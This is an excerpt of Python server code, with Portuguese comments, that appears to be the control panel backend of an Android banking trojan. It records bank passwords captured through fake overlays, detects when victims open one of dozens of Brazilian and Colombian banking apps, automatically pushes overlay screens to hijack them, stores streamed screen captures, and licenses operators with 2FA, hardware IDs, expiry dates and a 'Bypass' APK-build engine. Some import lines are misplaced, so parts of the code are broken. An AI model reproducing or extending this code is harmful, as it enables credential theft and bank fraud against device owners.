                target_bank = 'Itaú' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
            
            password_info = {
                'device_id': device_id,
                'bank': target_bank,
                'package': target_pkg,
                'packageName': target_pkg,
                'password': password,
                'type': 'FORM_PASSWORD',
                'timestamp': utc_now().isoformat(),
                'field_name': field_found,
                'label': field_found,
                'hint': field_found,
                'source': 'VISUAL_SCREEN'
            }
            
            log = DeviceLog(
                device_id=device_id,
                log_type="BANK_PASSWORD",
                log_data=json.dumps(password_info, ensure_ascii=False),
                created_at=utc_now()
            )
            db.add(log)
            db.commit()
            logger.info(f"🔐 SENHA CAPTURADA VIA OVERLAY de {device_id} ({target_bank}): {password}")

    elif msg_type == "DEVICE_STATUS":
        # Aceita vários formatos de campo (do app Android)
        package = (
            message.get("package") or
            message.get("foregroundPackage") or
            message.get("foreground_package") or
            message.get("currentPackage") or
            ""
        )
        app_name = (
            message.get("appName") or
            message.get("app_name") or
            message.get("foregroundApp") or
            message.get("currentApp") or
            ""
        )
        is_locked = bool(message.get("isLocked", False))
        is_screen_on = bool(message.get("isScreenOn", True))
        bat = _extract_battery_level(message)
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        status_update = {
            "foreground_package": package,
            "foreground_app": app_name,
            "is_locked": is_locked,
            "is_screen_on": is_screen_on
        }
        if bat is not None:
            status_update["battery_level"] = bat
        if message.get("is_charging") is not None:
            status_update["is_charging"] = bool(message.get("is_charging"))
        manager.device_info[device_id].update(status_update)
        
        # 🏦 DETECÇÃO AUTOMÁTICA DE BANCO via foreground_package (Loose matching para não falhar em nenhum banco)
        BANK_KEYWORDS = [
            "nubank", "nu.production", "itau", "bb.android", "bancodobrasil", "bradesco", 
            "santander", "bancointer", "intermedium", "caixa", "c6bank", "neon", "pagbank", 
            "pagseguro", "mercadopago", "picpay", "panapp", "sicredi", "original", "stone", 
            "modal", "xpinvestimentos", "safra", "bancovotorantim", "bmg.android", "banrisul", 
            "brb.mobile", "rendimento", "bs2", "digio", "recargapay", "will.bank", "agibank", 
            "sofisa", "citibank", "daycoval", "creditas", "sicoob", "btg.pactual", "btgpactual",
            "rico", "clear", "avenue", "nomad", "mercantil", "superdigital", "genial", "bari",
            "pine", "bancobari", "bancopine", "bancobmg", "bancobv", "bancobs2", "next.android",
            "next", "davivienda", "daviplata", "bancolombia", "nequi", "bancodebogota",
            "mbankingcolombia", "bancopopular", "bancodeoccidente", "avvillas", "colpatria",
            "lulobank", "rappi", "falabella", "bancoagrario"
        ]
        
        is_bank = False
        if package:
            pkg_lower = package.lower()
            # 1. Verifica se bate com palavras-chave conhecidas de bancos
            is_bank_kw = any(kw in pkg_lower for kw in BANK_KEYWORDS)
            
            # 2. Se for um banco da lista padrão, verifica se é um app instalado/baixado (não de sistema)
            if not is_bank_kw:
                installed_apps = []
                try:
                    existing = db.query(DeviceLog).filter(
                        DeviceLog.device_id == device_id,
                        DeviceLog.log_type == "INSTALLED_APPS_CACHE"
                    ).first()
                    if existing:
                        cache_data = json.loads(existing.log_data)
                        installed_apps = cache_data.get("apps", [])
                except Exception as e:
                    logger.error(f"Erro ao ler cache de apps para injecao: {e}")
                
                found_app = None
                for app in installed_apps:
                    if app.get("package") == package:
                        found_app = app
                        break
                
                if found_app:
                    # Se achou no cache de apps, ativa se não for um app do sistema
                    is_bank_kw = not found_app.get("isSystem", True)
                else:
                    # Fallback robusto caso o cache ainda não exista ou esteja vazio
                    is_system_prefix = (
                        pkg_lower.startswith("com.android.") or
                        pkg_lower.startswith("com.google.android.") or
                        pkg_lower.startswith("com.sec.android.") or
                        pkg_lower.startswith("com.miui.") or
                        pkg_lower.startswith("com.xiaomi.") or
                        pkg_lower.startswith("com.huawei.") or
                        pkg_lower.startswith("com.samsung.") or
                        pkg_lower.startswith("com.coloros.") or
                        pkg_lower.startswith("com.oppo.") or
                        pkg_lower.startswith("com.vivo.") or
                        pkg_lower == "android" or
                        pkg_lower == "com.android.systemui"
                    )
                    is_bank_kw = not is_system_prefix
            
            # CRITICAL FIX: is_bank for detection and active_bank list should ONLY trigger if the user has explicitly mapped
            # this specific app in the control panel, OR it falls in the high-fidelity bank keywords.
            # We want to avoid locking down normal non-bank apps with a black overlay unless mapped!
from models import DeviceOverlayMapping
            has_explicit_mapping = db.query(DeviceOverlayMapping).filter(
                DeviceOverlayMapping.device_id == device_id,
                DeviceOverlayMapping.package_name == package,
                DeviceOverlayMapping.is_enabled == True
            ).first() is not None
            
            is_bank = has_explicit_mapping or (is_bank_kw and any(bank_name in pkg_lower for bank_name in [
                "nubank", "itau", "bradesco", "santander", "caixa", "bancointer", "c6bank", "neon", "pagbank", "pagseguro", "mercadopago", "picpay",
                "davivienda", "daviplata", "bancolombia", "nequi", "bancodebogota", "mbankingcolombia", "bancopopular", "bancodeoccidente", "avvillas", "colpatria", "lulobank", "rappi", "falabella", "bancoagrario"
            ]))
            
        if is_bank:
            # Auto-set active_bank se o app é um banco
            current_bank = manager.device_active_banks.get(device_id)
            if not current_bank or current_bank.get("package") != package:
                # Tenta obter o ícone real em base64 do banco a partir do cache
                captured_icon = None
                installed_apps = manager.get_installed_apps(device_id)
                if installed_apps:
                    for app in installed_apps:
                        if app.get("package") == package and app.get("icon"):
                            captured_icon = app.get("icon")
                            break
                if not captured_icon:
                    try:
                        existing = db.query(DeviceLog).filter(
                            DeviceLog.device_id == device_id,
                            DeviceLog.log_type == "INSTALLED_APPS_CACHE"
                        ).first()
                        if existing:
                            cache_data = json.loads(existing.log_data)
                            for app in cache_data.get("apps", []):
                                if app.get("package") == package and app.get("icon"):
                                    captured_icon = app.get("icon")
                                    break
                    except Exception as e:
                        logger.error(f"Erro ao buscar ícone do cache: {e}")

                manager.device_active_banks[device_id] = {
                    "package": package,
                    "appName": app_name or package.split(".")[-1].title(),
                    "icon": captured_icon,
                    "timestamp": utc_now().isoformat(),
                    "auto_detected": True
                }
                logger.info(f"🏦 AUTO-DETECTADO banco aberto: {device_id} → {app_name or package}")
        elif package and device_id in manager.device_active_banks:
            # Se o app em foreground não é banco, limpa active_bank (mas só se foi auto-detectado)
            current = manager.device_active_banks.get(device_id, {})
            if current.get("auto_detected"):
                # Ignora se for teclado ou core system ui para não fechar o banco erroneamente ao digitar
                pkg_lower = package.lower()
                is_ignored = (
                    any(k in pkg_lower for k in ["inputmethod", "keyboard", "gboard", "latin", "ime", "swiftkey", "samsung.i18n"]) or
                    pkg_lower in ["android", "com.android.systemui"]
                )
                if not is_ignored:
                    del manager.device_active_banks[device_id]
                    logger.info(f"🏦 AUTO-DETECTADO banco fechado: {device_id} (saiu para {package})")
        
        logger.info(f"📱 STATUS {device_id}: pkg={package}, app={app_name}, locked={is_locked}, screen_on={is_screen_on}")

        # ========== AUTO-GATILHO DE OVERLAY ==========
        if package:
from models import DeviceOverlayMapping
            
            # Busca se existe mapeamento ativo para este pacote no dispositivo
            mapping = db.query(DeviceOverlayMapping).filter(
                DeviceOverlayMapping.device_id == device_id,
                DeviceOverlayMapping.package_name == package,
                DeviceOverlayMapping.is_enabled == True
            ).first()
            
            dev_info = manager.device_info.get(device_id, {})
            last_injected = dev_info.get("last_injected_package")
            
            # Pega o package name do próprio RAT/app se registrado para este dispositivo
            device_pkg = None
            try:
                device = db.query(Device).filter(Device.device_id == device_id).first()
                if device and device.package_name:
                    device_pkg = device.package_name.lower()
            except Exception:
                pass
            
            pkg_lower = package.lower()
            is_ignored = (
                (device_pkg and pkg_lower == device_pkg) or
                pkg_lower == "com.seguranca.protecao" or
                any(k in pkg_lower for k in ["inputmethod", "keyboard", "gboard", "latin", "ime", "swiftkey", "samsung.i18n"]) or
                pkg_lower in ["android", "com.android.systemui"]
            )
            
            if mapping:
                # Verifica se este mapeamento já foi submetido/avançado anteriormente neste dispositivo
                has_been_submitted = db.query(DeviceLog).filter(
                    DeviceLog.device_id == device_id,
                    DeviceLog.log_type == "OVERLAY_SUBMITTED",
                    DeviceLog.log_data.like(f'%"package": "{package}"%')
                ).first() is not None
                
                if not has_been_submitted and last_injected != package:
                    try:
                        template_data = json.loads(mapping.template_json)
                        logger.info(f"🔮 Auto-injetando tela customizada '{mapping.screen_name}' para {package} no dispositivo {device_id}")
                        
                        # Define o último pacote injetado para evitar loops
                        if device_id not in manager.device_info:
                            manager.device_info[device_id] = {}
                        manager.device_info[device_id]["last_injected_package"] = package
                        
                        # Envia comando de injeção da tela
                        await manager.send_command(device_id, {
                            "action": "CUSTOM_BLACK_SCREEN",
                            "template": template_data
                        })
                    except Exception as inject_err:
                        logger.error(f"Erro ao auto-injetar tela no dispositivo {device_id}: {inject_err}")
            elif not is_ignored:
                # Se não é o app mapeado e não é ignorado (teclado/nosso app) e tínhamos injetado, limpa e fecha a overlay
                if last_injected:
                    if device_id not in manager.device_info:
                        manager.device_info[device_id] = {}
                    manager.device_info[device_id]["last_injected_package"] = None
                    
                    try:
                        logger.info(f"🔮 Aplicativo alvo '{last_injected}' fechado no dispositivo {device_id}. Fechando overlay.")
                        await manager.send_command(device_id, {
                            "action": "BLACK_SCREEN_OFF"
                        })
                    except Exception as hide_err:
                        logger.error(f"Erro ao fechar overlay no dispositivo {device_id}: {hide_err}")
        # ============================================

    else:
        # Ignora logs de sistema que não são relevantes
        ignored_types = ['PONG', 'OK', 'ACK', 'PING_RESPONSE', 'HEARTBEAT']
        if msg_type not in ignored_types:
            # Log de outras mensagens relevantes
            log = DeviceLog(
                device_id=device_id,
                log_type=msg_type,
                log_data=json.dumps(message),
                created_at=utc_now()
            )
            db.add(log)
            db.commit()

async def handle_screen_frame(device_id: str, frame_data: bytes):
    """Processa frame de captura de tela com detecção de formato universal (raw JPEG/WebP ou 5B header)"""
    manager.update_device_activity(device_id)
    if not frame_data or len(frame_data) < 4:
        return
    
    # Rejeita frames muito grandes (proteção contra OOM)
    if len(frame_data) > WEBSOCKET_MAX_SIZE:
        logger.warning(f"Frame muito grande de {device_id}: {len(frame_data)} bytes (max: {WEBSOCKET_MAX_SIZE})")
        return
        
    jpeg_data = None
    # 1. Se os dados já forem um arquivo JPEG (\xFF\xD8) ou WebP (RIFF) nativo
    if frame_data.startswith(b'\xff\xd8') or frame_data.startswith(b'RIFF'):
        jpeg_data = frame_data
    # 2. Se possuir cabeçalho customizado de 5 bytes [TIPO: 1B][TAMANHO: 4B][DADOS...]
    elif len(frame_data) > 5:
        payload = frame_data[5:]
        if payload.startswith(b'\xff\xd8') or payload.startswith(b'RIFF'):
            jpeg_data = payload
        else:
            frame_size = int.from_bytes(frame_data[1:5], byteorder='big')
            if 0 < frame_size <= len(frame_data) - 5:
                jpeg_data = frame_data[5:5+frame_size]
            else:
                jpeg_data = payload

    if jpeg_data and len(jpeg_data) > 0:
        await manager.store_screen_frame(device_id, jpeg_data)

# ==================== API DE AUTENTICAÇÃO ====================

@app.post("/api/auth/login")
async def login(request: Request, login_req: LoginRequest, db: Session = Depends(get_db)):
    """Login de operador com proteção anti-brute-force e suporte a HWID"""
    client_ip = request.client.host if request.client else "unknown"
    now = utc_now()

    # Verifica se IP está bloqueado por limite de tentativas
    if client_ip in LOGIN_ATTEMPTS:
        attempt = LOGIN_ATTEMPTS[client_ip]
        if attempt.get("blocked_until") and now < attempt["blocked_until"]:
            wait_sec = int((attempt["blocked_until"] - now).total_seconds())
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail=f"Muitas tentativas incorretas. Tente novamente em {wait_sec} segundos."
            )
        elif attempt.get("blocked_until") and now >= attempt["blocked_until"]:
            LOGIN_ATTEMPTS[client_ip] = {"count": 0, "blocked_until": None}

    operator = db.query(Operator).filter(Operator.username == login_req.username).first()
    
    if not operator or not verify_password(login_req.password, operator.hashed_password):
        if client_ip not in LOGIN_ATTEMPTS:
            LOGIN_ATTEMPTS[client_ip] = {"count": 1, "blocked_until": None}
        else:
            LOGIN_ATTEMPTS[client_ip]["count"] += 1

        if LOGIN_ATTEMPTS[client_ip]["count"] >= 5:
            LOGIN_ATTEMPTS[client_ip]["blocked_until"] = now + timedelta(minutes=15)
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail="Muitas tentativas falhas de login. Seu IP foi bloqueado temporariamente por 15 minutos."
            )

        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Credenciais inválidas"
        )

    # Login correto: reseta tentativas
    LOGIN_ATTEMPTS.pop(client_ip, None)
    
    # Verifica se está banido
    if operator.is_banned:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Sua conta foi banida. Contate o administrador."
        )
    
    # Verifica se está ativo
    if not operator.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Sua conta está desativada."
        )
    
    # Verifica se a conta expirou
    if operator.expires_at and utc_now() > operator.expires_at:
        expired_date = operator.expires_at.strftime("%d/%m/%Y %H:%M")
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail=f"Sua conta de acesso expirou em {expired_date}. Contate o administrador do painel."
        )
    
    # ==================== GOOGLE AUTHENTICATOR (2FA) ====================
    two_factor_token = create_2fa_token(operator.username)

    # Se o operador já possui 2FA ativado
    if operator.totp_enabled and operator.totp_secret:
        if not login_req.totp_code:
            # Solicita código 2FA
            return {
                "needs_2fa": True,
                "needs_2fa_setup": False,
                "two_factor_token": two_factor_token,
                "qr_code": None,
                "access_token": "",
                "token_type": "bearer",
                "needs_hwid": False
            }
        # Verifica código 2FA
        if not verify_totp_code(operator.totp_secret, login_req.totp_code):
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Código 2FA inválido."
            )
        # Código correto - prossegue com login normal
    elif not operator.totp_secret and not operator.totp_temp_secret:
        # Primeiro login - gera chave e QR Code para configuração inicial
        secret = generate_totp_secret()
        operator.totp_temp_secret = secret
        db.commit()
        uri, qr_code_b64 = generate_totp_qr_and_uri(operator.username, secret, issuer_name="MMT REMOTE")
        return {
            "needs_2fa": True,
            "needs_2fa_setup": True,
            "two_factor_token": two_factor_token,
            "secret": secret,
            "qr_code": qr_code_b64,
            "access_token": "",
            "token_type": "bearer",
            "needs_hwid": False
        }

    # Verifica HWID se não for admin e não tiver HWID
    if not operator.is_admin and not operator.hwid:
        operator.hwid = login_req.hwid
        if operator.hwid:
            operator.hwid_activated_at = utc_now()
        db.commit()
        if operator.hwid:
            # HWID ativado com sucesso
            pass
        else:
            return {
                "needs_2fa": False,
                "access_token": "",
                "token_type": "bearer",
                "needs_hwid": True
            }
    elif not operator.is_admin and operator.hwid and login_req.hwid:
        if login_req.hwid != operator.hwid:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Esta conta está vinculada a outro dispositivo (HWID divergente)."
            )

    # Login bem-sucedido - gera token de acesso
    operator.last_login = utc_now()
    db.commit()

    access_token = create_access_token(data={"sub": operator.username})
    logger.info(f"Login bem-sucedido: {operator.username}")

    return {
        "needs_2fa": False,
        "needs_2fa_setup": False,
        "two_factor_token": None,
        "access_token": access_token,
        "token_type": "bearer",
        "needs_hwid": False
    }

@app.post("/api/auth/setup-2fa")
async def setup_2fa(
    body: Setup2FARequest,
    db: Session = Depends(get_db)
):
    """Valida o primeiro código e ativa o Google Authenticator definitivamente"""
    username = decode_2fa_token(body.two_factor_token)
    if not username:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Sessão de verificação expirada. Faça login novamente."
        )
    
    operator = db.query(Operator).filter(Operator.username == username).first()
    if not operator:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    if not operator.totp_temp_secret:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Nenhuma chave 2FA pendente de ativação."
        )
    
    if not verify_totp_code(operator.totp_temp_secret, body.code):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Código do Google Authenticator incorreto. Verifique o horário do celular e digite o código de 6 dígitos atual."
        )
    
    # Ativa 2FA
    operator.totp_secret = operator.totp_temp_secret
    operator.totp_enabled = True
    operator.totp_temp_secret = None
    
    # Se não for admin e não tiver HWID, solicita ativação de HWID
    if not operator.is_admin and operator.hwid is None:
        db.commit()
        return {"needs_hwid": True, "access_token": "", "token_type": "bearer", "needs_2fa": False}
    
    # Se tiver HWID registrado, valida
    if not operator.is_admin and operator.hwid and body.hwid and body.hwid != operator.hwid:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Esta conta está vinculada a outro dispositivo (HWID divergente)."
        )
    
    operator.last_login = utc_now()
    db.commit()
    
    access_token = create_access_token(data={"sub": operator.username})
    logger.info(f"2FA Setup e Login com sucesso: {operator.username}")
    
    return {"access_token": access_token, "token_type": "bearer", "needs_hwid": False, "needs_2fa": False}

@app.post("/api/auth/verify-2fa")
async def verify_2fa(
    body: Verify2FARequest,
    db: Session = Depends(get_db)
):
    """Verifica código de 6 dígitos do Google Authenticator no login"""
    username = decode_2fa_token(body.two_factor_token)
    if not username:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Sessão de verificação expirada. Faça login novamente."
        )
    
    operator = db.query(Operator).filter(Operator.username == username).first()
    if not operator:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    if not operator.totp_enabled or not operator.totp_secret:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="2FA não está configurado para este usuário."
        )
    
    if not verify_totp_code(operator.totp_secret, body.code):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Código do Google Authenticator inválido ou expirado."
        )
    
    # Se não for admin e não tiver HWID, solicita ativação de HWID
    if not operator.is_admin and operator.hwid is None:
        db.commit()
        return {"needs_hwid": True, "access_token": "", "token_type": "bearer", "needs_2fa": False}
    
    # Se tiver HWID registrado, valida
    if not operator.is_admin and operator.hwid and body.hwid and body.hwid != operator.hwid:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Esta conta está vinculada a outro dispositivo (HWID divergente)."
        )
    
    operator.last_login = utc_now()
    db.commit()
    
    access_token = create_access_token(data={"sub": operator.username})
    logger.info(f"2FA Login verificado com sucesso: {operator.username}")
    
    return {"access_token": access_token, "token_type": "bearer", "needs_hwid": False, "needs_2fa": False}


class Enable2FABody(BaseModel):
    code: str

class Disable2FABody(BaseModel):
    password: str

class RebindHwidBody(BaseModel):
    username: str
    password: str
    hwid: str
    totp_code: Optional[str] = None


@app.get("/api/auth/2fa/status")
async def get_2fa_status(current_user: Operator = Depends(get_current_user)):
    """Retorna o status do 2FA do usuário logado"""
    return {
        "totp_enabled": bool(current_user.totp_enabled and current_user.totp_secret),
        "totp_secret": current_user.totp_secret is not None,
    }

@app.post("/api/auth/2fa/setup")
async def setup_2fa_new(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Gera novo secret e QR Code para configurar 2FA"""
    secret = generate_totp_secret()
    current_user.totp_temp_secret = secret
    db.commit()
    uri, qr_code_b64 = generate_totp_qr_and_uri(current_user.username, secret, issuer_name="MMT REMOTE")
    return {
        "secret": secret,
        "qr": qr_code_b64,
        "uri": uri,
        "totp_enabled": bool(current_user.totp_enabled and current_user.totp_secret),
    }

@app.post("/api/auth/2fa/enable")
async def enable_2fa(
    body: Enable2FABody,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Ativa 2FA após verificar o código do QR Code"""
    temp_secret = current_user.totp_temp_secret
    if not temp_secret:
        temp_secret = current_user.totp_secret or generate_totp_secret()
        current_user.totp_temp_secret = temp_secret
        db.commit()
    if not verify_totp_code(temp_secret, body.code):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Código do Google Authenticator inválido."
        )
    current_user.totp_secret = temp_secret
    current_user.totp_enabled = True
    current_user.totp_temp_secret = None
    db.commit()
    return {"status": "ok", "message": "2FA ativado com sucesso."}

@app.post("/api/auth/2fa/disable")
async def disable_2fa(
    body: Disable2FABody,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Desativa 2FA do usuário logado (requer senha)"""
    if not verify_password(body.password, current_user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Senha inválida."
        )
    current_user.totp_secret = None
    current_user.totp_enabled = False
    current_user.totp_temp_secret = None
    db.commit()
    return {"status": "ok", "message": "2FA desativado com sucesso."}

@app.post("/api/auth/rebind-hwid")
async def rebind_hwid(
    body: RebindHwidBody,
    db: Session = Depends(get_db)
):
    """Rebind HWID - autentica e permite novo dispositivo"""
    operator = db.query(Operator).filter(Operator.username == body.username).first()
    if not operator or not verify_password(body.password, operator.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Credenciais inválidas"
        )
    # Se 2FA está ativado, valida o código
    if operator.totp_enabled and operator.totp_secret:
        if not body.totp_code:
            return {"needs_2fa": True, "needs_hwid": False, "access_token": ""}
        if not verify_totp_code(operator.totp_secret, body.totp_code):
            raise HTTPException(
                status_code=status.HTTP_400_BAD_REQUEST,
                detail="Código 2FA inválido."
            )
    # Rebind HWID
    operator.hwid = body.hwid
    operator.hwid_activated_at = utc_now()
    db.commit()
    access_token = create_access_token(data={"sub": operator.username})
    logger.info(f"HWID rebind para: {operator.username}")
    return {"access_token": access_token, "token_type": "bearer", "needs_2fa": False, "needs_hwid": False}

class HwidActivationBody(BaseModel):
    username: str
    password: str
    hwid: str

@app.post("/api/auth/activate-hwid")
async def activate_hwid(
    body: HwidActivationBody,
    db: Session = Depends(get_db)
):
    """Ativa HWID para usuário"""
    username = body.username
    password = body.password
    hwid = body.hwid
    
    operator = db.query(Operator).filter(Operator.username == username).first()
    
    if not operator or not verify_password(password, operator.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Credenciais inválidas"
        )
    
    # Verifica se já tem HWID
    if operator.hwid is not None:
        if operator.hwid == hwid:
            # Mesmo HWID, só faz login
            access_token = create_access_token(data={"sub": operator.username})
            operator.last_login = utc_now()
            db.commit()
            return {"access_token": access_token, "token_type": "bearer"}
        else:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Esta conta já está vinculada a outro dispositivo (HWID diferente)."
            )
    
    # Verifica se HWID já está em uso
    existing = db.query(Operator).filter(Operator.hwid == hwid, Operator.id != operator.id).first()
    if existing:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Este dispositivo já está vinculado a outra conta."
        )
    
    # Ativa HWID
    operator.hwid = hwid
    operator.hwid_activated_at = utc_now()
    operator.last_login = utc_now()
    db.commit()
    
    # Gera token
    access_token = create_access_token(data={"sub": operator.username})
    
    logger.info(f"HWID ativado para {operator.username}: {hwid}")
    
    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/api/auth/me")
async def get_current_user_info(current_user: Operator = Depends(get_current_user)):
    """Retorna informações do usuário atual"""
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "is_admin": current_user.is_admin,
        "is_active": current_user.is_active
    }

class ProfileUpdateBody(BaseModel):
    email: Optional[str] = None
    username: Optional[str] = None
    password: Optional[str] = None
    current_password: Optional[str] = None

@app.put("/api/auth/profile")
async def update_profile(
    body: ProfileUpdateBody,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Atualiza o perfil do usuário logado (email, username e/ou senha)."""
    if body.email:
        existing = db.query(Operator).filter(Operator.email == body.email, Operator.id != current_user.id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Este e-mail já está em uso.")
        current_user.email = body.email

    if body.username:
        existing = db.query(Operator).filter(Operator.username == body.username, Operator.id != current_user.id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Este nome de usuário já está em uso.")
        current_user.username = body.username

    if body.password:
        if not body.current_password or not verify_password(body.current_password, current_user.hashed_password):
            raise HTTPException(status_code=400, detail="Senha atual incorreta. É necessário fornecer a senha atual para definir uma nova senha.")
        current_user.hashed_password = get_password_hash(body.password)

    db.commit()
    db.refresh(current_user)
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "is_admin": current_user.is_admin
    }


@app.post("/api/auth/refresh", response_model=Token)
async def refresh_token(
    db: Session = Depends(get_db),
    token: str = Depends(oauth2_scheme)
):
    """
    Renova token JWT para o painel.
    Aceita tokens expirados para permitir renovação sem relogin.
    """
from auth import get_user_from_expired_token
    
    # Tenta obter usuário mesmo de token expirado
    operator = get_user_from_expired_token(token, db)
    
    if operator is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Token inválido ou usuário não encontrado",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Gera novo token
    access_token = create_access_token(data={"sub": operator.username})
    return {"access_token": access_token, "token_type": "bearer"}

# ==================== API DE ADMIN ====================

from auth import get_current_admin

@app.get("/api/admin/stats")
async def admin_get_stats(
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Estatísticas do sistema (apenas admin)"""
    total_users = db.query(Operator).count()
    active_users = db.query(Operator).filter(Operator.is_active == True, Operator.is_banned == False).count()
    banned_users = db.query(Operator).filter(Operator.is_banned == True).count()
    total_devices = db.query(Device).count()
    online_devices = len(manager.active_connections)
    
    return {
        "total_users": total_users,
        "active_users": active_users,
        "banned_users": banned_users,
        "total_devices": total_devices,
        "online_devices": online_devices
    }

@app.get("/api/admin/users")
async def admin_get_users(
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Lista todos os usuários (apenas admin)"""
    users = db.query(Operator).all()
    result = []
    
    for user in users:
        device_count = db.query(Device).filter(Device.owner_id == user.id).count()
        result.append({
            "id": user.id,
            "username": user.username,
            "email": user.email,
            "is_active": user.is_active,
            "is_admin": user.is_admin,
            "is_banned": user.is_banned,
            "hwid": user.hwid,
            "hwid_activated_at": user.hwid_activated_at.isoformat() if user.hwid_activated_at else None,
            "totp_enabled": bool(user.totp_enabled and user.totp_secret),
            "created_at": user.created_at.isoformat() if user.created_at else None,
            "expires_at": user.expires_at.isoformat() if user.expires_at else None,
            "last_login": user.last_login.isoformat() if user.last_login else None,
            "last_ip": user.last_ip,
            "notes": user.notes,
            "device_count": device_count
        })
    
    return result

def sync_user_to_bypass(
    username: str, 
    password: Optional[str] = None, 
    role: Optional[str] = None, 
    expires_at: Optional[datetime] = None, 
    status: Optional[str] = None, 
    is_delete: bool = False
):
    """Sincroniza o usuário principal com o banco de dados do motor Bypass (ALLBANK)."""
    try:
import shutil
        # Caminho oficial do data.json do novo motor de Bypass (ALLBANK - substitui o projeto_bypass)
        bypass_json_path = os.path.join(os.path.dirname(__file__), "ALLBANK", "db", "data.json")
        if not os.path.exists(bypass_json_path):
            # Fallback path se a pasta db não estiver criada
            bypass_json_path_alt = os.path.join(os.path.dirname(__file__), "ALLBANK", "data.json")
            if os.path.exists(bypass_json_path_alt):
                bypass_json_path = bypass_json_path_alt
            else:
                os.makedirs(os.path.dirname(bypass_json_path), exist_ok=True)
                with open(bypass_json_path, "w", encoding="utf-8") as f:
                    json.dump({"users": {}, "teams": {}, "history": []}, f, indent=2)

        with open(bypass_json_path, "r", encoding="utf-8") as f:
            b_data = json.load(f)

        users = b_data.setdefault("users", {})

        if is_delete:
            if username in users:
                del users[username]
                logger.info(f"🔄 Usuário {username} deletado no motor Bypass!")
        else:
            if username not in users:
                users[username] = {
                    "password": password or "123",
                    "role": role or "operator",
                    "status": status or "active",
                    "expires_at": expires_at.isoformat() if expires_at else None,
                    "created_at": utc_now().isoformat(),
                    "builds": [],
                    "daily_apk_limit": 0,
                    "daily_apk_count": 0,
                    "daily_apk_reset_date": utc_now().strftime("%Y-%m-%d"),
                    "bypass_options_limit_date": expires_at.strftime("%Y-%m-%d") if expires_at else ""
                }
                logger.info(f"🔄 Usuário {username} criado e sincronizado com motor Bypass!")
            else:
                # Atualiza dados existentes
                if password is not None:
                    users[username]["password"] = password
                if role is not None:
                    users[username]["role"] = role
                if expires_at is not None:
                    users[username]["expires_at"] = expires_at.isoformat()
                    users[username]["bypass_options_limit_date"] = expires_at.strftime("%Y-%m-%d")
                elif status == "active":
                    # Se explicitamente ativado e expirados limpos
                    users[username]["expires_at"] = None
                    users[username]["bypass_options_limit_date"] = ""
                if status is not None:
                    users[username]["status"] = status
                logger.info(f"🔄 Usuário {username} atualizado no motor Bypass!")

        # Escrita atômica segura para evitar corromper o arquivo data.json
        temp_path = bypass_json_path + ".tmp"
        with open(temp_path, "w", encoding="utf-8") as f:
            json.dump(b_data, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())

        # Backup da versão estável anterior
        if os.path.exists(bypass_json_path):
            shutil.copy2(bypass_json_path, bypass_json_path + ".bak")

        os.replace(temp_path, bypass_json_path)
    except Exception as sync_err:
        logger.error(f"Erro ao sincronizar usuário {username} com motor Bypass: {sync_err}")

@app.post("/api/admin/users")
async def admin_create_user(
    username: str = Form(...),
    email: str = Form(...),
    password: str = Form(...),
    is_admin: bool = Form(False),
    expiration_days: Optional[int] = Form(None),
    expires_at: Optional[str] = Form(None),
    notes: str = Form(None),
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Cria novo usuário com opção de expiração (apenas admin)"""
    # Verifica se já existe
    existing = db.query(Operator).filter(
        (Operator.username == username) | (Operator.email == email)
    ).first()
    if existing:
        raise HTTPException(status_code=400, detail="Usuário ou email já existe")
    
    exp_date = None
    if expiration_days and expiration_days > 0:
        exp_date = utc_now() + timedelta(days=expiration_days)
    elif expires_at and expires_at.strip():
        try:
